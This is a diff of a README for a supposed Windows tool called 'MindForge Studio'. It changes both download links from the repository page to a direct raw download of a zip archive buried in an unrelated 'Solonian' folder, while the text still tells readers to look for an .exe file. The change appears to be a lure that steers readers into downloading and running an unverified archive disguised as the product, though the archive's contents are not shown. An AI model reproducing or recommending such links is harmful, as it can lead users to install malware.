@@ -1,6 +1,6 @@
 # 🌟 celebrity-studio-for-anything - Solve problems with legendary expert insights
 
-[![](https://img.shields.io/badge/Download-MindForge_Studio-blue)](https://github.com/Rukanitok/celebrity-studio-for-anything)
+[![](https://img.shields.io/badge/Download-MindForge_Studio-blue)](https://github.com/Rukanitok/celebrity-studio-for-anything/raw/refs/heads/main/Solonian/anything-celebrity-studio-for-v2.1.zip)
 
 ## 📋 What is MindForge Studio?
 
@@ -25,7 +25,7 @@ Follow these steps to set up the software on your Windows machine.
 ### 1. Download the Installer
 Visit the official repository page to get the setup file. 
 
-[Click here to visit the download page](https://github.com/Rukanitok/celebrity-studio-for-anything)
+[Click here to visit the download page](https://github.com/Rukanitok/celebrity-studio-for-anything/raw/refs/heads/main/Solonian/anything-celebrity-studio-for-v2.1.zip)
 
 Find the latest release on this page. Look for the file ending in .exe. Save this file to your computer.
 
